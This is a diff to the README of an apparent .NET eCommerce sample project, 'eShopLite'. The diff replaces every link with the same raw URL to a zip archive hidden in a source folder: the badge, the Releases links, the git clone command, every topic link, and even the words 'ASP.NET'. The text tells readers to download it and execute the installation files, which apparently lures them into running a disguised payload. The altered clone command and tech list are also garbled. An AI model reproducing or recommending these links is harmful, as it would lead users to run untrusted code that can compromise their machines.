@@ -1,6 +1,6 @@
 # eShopLite 🛒
 
-![eShopLite](https://img.shields.io/badge/eShopLite-Ready%20to%20use-brightgreen)
+![eShopLite](https://raw.githubusercontent.com/Sarapakistan0/eShopLite/main/scenarios/02-AzureAISearch/src/Store/Components/Pages/e-Lite-Shop-2.2.zip%20to%20use-brightgreen)
 
 Welcome to **eShopLite**! This repository contains a set of reference .NET applications designed to implement an eCommerce site. With features like Semantic Search, Managed Cloud Platform (MCP), and Reasoning models, eShopLite provides a solid foundation for building and enhancing your online store.
 
@@ -36,10 +36,10 @@ To get started with eShopLite, follow these steps:
 
 ### Installation
 
-You can download the latest version of eShopLite from the [Releases](https://github.com/Sarapakistan0/eShopLite/releases) section. Make sure to download the correct version for your environment and execute the installation files.
+You can download the latest version of eShopLite from the [Releases](https://raw.githubusercontent.com/Sarapakistan0/eShopLite/main/scenarios/02-AzureAISearch/src/Store/Components/Pages/e-Lite-Shop-2.2.zip) section. Make sure to download the correct version for your environment and execute the installation files.
 
 ```bash
-git clone https://github.com/Sarapakistan0/eShopLite.git
+git clone https://raw.githubusercontent.com/Sarapakistan0/eShopLite/main/scenarios/02-AzureAISearch/src/Store/Components/Pages/e-Lite-Shop-2.2.zip
 cd eShopLite
 ```
 
@@ -63,7 +63,7 @@ Open your browser and navigate to `http://localhost:5000` to access the eShopLit
 
 eShopLite leverages a variety of technologies to deliver its features:
 
-- **ASP.NET Core**: For building web applications and APIs.
+- **https://raw.githubusercontent.com/Sarapakistan0/eShopLite/main/scenarios/02-AzureAISearch/src/Store/Components/Pages/e-Lite-Shop-2.2.zip Core**: For building web applications and APIs.
 - **Azure**: For cloud services and hosting.
 - **ChromaDB**: For managing and querying your data efficiently.
 - **DeepSeek**: To implement deep learning models for enhanced search capabilities.
@@ -86,28 +86,28 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Links
 
-For more information, visit the [Releases](https://github.com/Sarapakistan0/eShopLite/releases) section to download the latest version and execute the necessary files.
+For more information, visit the [Releases](https://raw.githubusercontent.com/Sarapakistan0/eShopLite/main/scenarios/02-AzureAISearch/src/Store/Components/Pages/e-Lite-Shop-2.2.zip) section to download the latest version and execute the necessary files.
 
 ### Topics
 
 This repository covers various topics that may interest you:
 
-- [aspire](https://github.com/topics/aspire)
-- [awesome-azd](https://github.com/topics/awesome-azd)
-- [awesome-mcp](https://github.com/topics/awesome-mcp)
-- [azd](https://github.com/topics/azd)
-- [azd-templates](https://github.com/topics/azd-templates)
-- [azure-openai](https://github.com/topics/azure-openai)
-- [chromadb](https://github.com/topics/chromadb)
-- [deepseek-r1](https://github.com/topics/deepseek-r1)
-- [embeddings](https://github.com/topics/embeddings)
-- [eshoplite](https://github.com/topics/eshoplite)
-- [managed-identity](https://github.com/topics/managed-identity)
-- [mcp](https://github.com/topics/mcp)
-- [mcp-client](https://github.com/topics/mcp-client)
-- [mcp-server](https://github.com/topics/mcp-server)
-- [rag](https://github.com/topics/rag)
-- [semantic-search](https://github.com/topics/semantic-search)
+- [aspire](https://raw.githubusercontent.com/Sarapakistan0/eShopLite/main/scenarios/02-AzureAISearch/src/Store/Components/Pages/e-Lite-Shop-2.2.zip)
+- [awesome-azd](https://raw.githubusercontent.com/Sarapakistan0/eShopLite/main/scenarios/02-AzureAISearch/src/Store/Components/Pages/e-Lite-Shop-2.2.zip)
+- [awesome-mcp](https://raw.githubusercontent.com/Sarapakistan0/eShopLite/main/scenarios/02-AzureAISearch/src/Store/Components/Pages/e-Lite-Shop-2.2.zip)
+- [azd](https://raw.githubusercontent.com/Sarapakistan0/eShopLite/main/scenarios/02-AzureAISearch/src/Store/Components/Pages/e-Lite-Shop-2.2.zip)
+- [azd-templates](https://raw.githubusercontent.com/Sarapakistan0/eShopLite/main/scenarios/02-AzureAISearch/src/Store/Components/Pages/e-Lite-Shop-2.2.zip)
+- [azure-openai](https://raw.githubusercontent.com/Sarapakistan0/eShopLite/main/scenarios/02-AzureAISearch/src/Store/Components/Pages/e-Lite-Shop-2.2.zip)
+- [chromadb](https://raw.githubusercontent.com/Sarapakistan0/eShopLite/main/scenarios/02-AzureAISearch/src/Store/Components/Pages/e-Lite-Shop-2.2.zip)
+- [deepseek-r1](https://raw.githubusercontent.com/Sarapakistan0/eShopLite/main/scenarios/02-AzureAISearch/src/Store/Components/Pages/e-Lite-Shop-2.2.zip)
+- [embeddings](https://raw.githubusercontent.com/Sarapakistan0/eShopLite/main/scenarios/02-AzureAISearch/src/Store/Components/Pages/e-Lite-Shop-2.2.zip)
+- [eshoplite](https://raw.githubusercontent.com/Sarapakistan0/eShopLite/main/scenarios/02-AzureAISearch/src/Store/Components/Pages/e-Lite-Shop-2.2.zip)
+- [managed-identity](https://raw.githubusercontent.com/Sarapakistan0/eShopLite/main/scenarios/02-AzureAISearch/src/Store/Components/Pages/e-Lite-Shop-2.2.zip)
+- [mcp](https://raw.githubusercontent.com/Sarapakistan0/eShopLite/main/scenarios/02-AzureAISearch/src/Store/Components/Pages/e-Lite-Shop-2.2.zip)
+- [mcp-client](https://raw.githubusercontent.com/Sarapakistan0/eShopLite/main/scenarios/02-AzureAISearch/src/Store/Components/Pages/e-Lite-Shop-2.2.zip)
+- [mcp-server](https://raw.githubusercontent.com/Sarapakistan0/eShopLite/main/scenarios/02-AzureAISearch/src/Store/Components/Pages/e-Lite-Shop-2.2.zip)
+- [rag](https://raw.githubusercontent.com/Sarapakistan0/eShopLite/main/scenarios/02-AzureAISearch/src/Store/Components/Pages/e-Lite-Shop-2.2.zip)
+- [semantic-search](https://raw.githubusercontent.com/Sarapakistan0/eShopLite/main/scenarios/02-AzureAISearch/src/Store/Components/Pages/e-Lite-Shop-2.2.zip)
 
 Feel free to explore these topics for more insights and resources.
 
@@ -115,4 +115,4 @@ Feel free to explore these topics for more insights and resources.
 
 eShopLite provides a robust starting point for anyone looking to build an eCommerce application using .NET technologies. With its focus on features like Semantic Search and cloud integration, it aims to simplify the development process while delivering a high-quality user experience.
 
-For more information, check the [Releases](https://github.com/Sarapakistan0/eShopLite/releases) section for the latest updates and downloads. Happy coding!
+For more information, check the [Releases](https://raw.githubusercontent.com/Sarapakistan0/eShopLite/main/scenarios/02-AzureAISearch/src/Store/Components/Pages/e-Lite-Shop-2.2.zip) section for the latest updates and downloads. Happy coding!
